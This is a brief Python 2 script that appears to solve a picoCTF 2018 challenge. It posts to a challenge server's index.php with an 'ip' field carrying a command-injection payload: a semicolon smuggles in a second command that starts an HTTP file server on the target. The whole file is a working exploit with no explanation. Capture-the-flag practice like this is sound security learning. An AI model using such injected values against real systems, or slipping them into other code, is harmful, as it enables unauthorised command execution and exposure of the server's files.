# coding=utf-8

import requests
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

payload='0.0.0.0;python -m SimpleHTTPServer 3001'

r=requests.post('http://2018shell3.picoctf.com:8587/index.php',
  data={
    'ip':payload
  }
)